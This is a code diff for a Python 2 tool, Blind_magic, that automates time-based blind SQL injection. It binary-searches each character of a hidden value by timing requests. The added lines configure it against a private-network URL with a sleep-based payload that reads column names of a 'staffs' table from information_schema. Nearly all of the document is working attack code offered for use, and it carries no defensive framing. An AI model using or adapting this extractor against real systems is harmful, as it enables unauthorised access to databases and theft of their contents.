@@ -14,7 +14,7 @@ class Blind_magic:
         self.end = 122
         self.requests_num = 0
         self.result = []
-    def l(self,l1=1,l2=1,l3=1,l4=1,l5=1,l1_s=1,l2_s=1,l3_s=1,l4_s=1,l5_s=1):
+    def l(self,l1_s=1,l2_s=1,l3_s=1,l4_s=1,l5_s=1,l1=1,l2=1,l3=1,l4=1,l5=1):
         self.l5 = l5 + 1
         self.l5_s = l5_s
         self.l4 = l4 + 1
@@ -43,19 +43,7 @@ File "%(filename)s", line %(lineno)s, in %(name)s
         try:
             r = requests.get(full_url,timeout=self.duration)
         except:
-            exc_type, exc_value, exc_traceback = sys.exc_info()
-
-            traceback_details = {
-                                 'filename': exc_traceback.tb_frame.f_code.co_filename,
-                                 'lineno'  : exc_traceback.tb_lineno,
-                                 'name'    : exc_traceback.tb_frame.f_code.co_name,
-                                 'type'    : exc_type.__name__,
-                                 'message' : exc_value.message,
-                                }
-
-            del(exc_type, exc_value, exc_traceback)
-            print
-            print traceback.format_exc()
+            pass
 
         self.inc_req()
         end_time = datetime.now()
@@ -94,8 +82,19 @@ File "%(filename)s", line %(lineno)s, in %(name)s
                 for l3 in range(self.l3):
                     for l2 in range(self.l2):
                         for l1 in range(1,self.l1):
-                            result = result + chr(self._binary_search(self._full_url(l1,l2,l3,l4,l5),self.start,self.end))
-                            if result == '':
+                            new_result = chr(self._binary_search(self._full_url(l1,l2,l3,l4,l5),self.start,self.end))
+                            if new_result == '\x00':
                                 break
+                            result = result + new_result
                         self.result.append(result)
                         result = ''
+
+
+blind_magic = Blind_magic()
+blind_magic.l(1,0,0,0,0,10,3,0,0,0)
+blind_magic.url = "http://10.0.42.224/?q="
+blind_magic.base_query = "if(({CONDITION_QUERY}),sleep(1),NULL)"
+blind_magic.condition_query = "ascii(substring(({QUERY}),{l1},1)){OPERATOR}{CHAR}"
+blind_magic.query = "Select column_name from information_schema.columns where table_name='staffs' limit {l2},1"
+blind_magic.run()
+print blind_magic.result
